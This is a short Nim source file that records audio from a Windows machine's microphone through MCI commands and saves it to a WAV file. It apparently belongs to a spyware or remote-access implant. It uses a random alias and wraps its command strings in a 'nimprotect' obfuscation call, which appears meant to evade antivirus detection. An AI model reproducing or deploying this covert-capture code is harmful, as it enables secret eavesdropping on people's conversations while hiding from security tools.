import winim
import helpers
import nimprotect
import os


proc record_audio*(wav_file_path: string, record_time: int): bool =
    
    var alias_name = get_random_string(6)

    if mciSendString(protectString("open new type waveaudio alias ") & alias_name, "", 0, 0) != 0 or
     (mciSendString(protectString("record ") & alias_name, "", 0, 0)) != 0:
        return false
    
    sleep(record_time * 1000)

    if mciSendString("save " & alias_name & " " & wav_file_path, "", 0, 0) != 0 or
     (mciSendString("close " & alias_name, "", 0, 0)) != 0:        
        return false

    return true

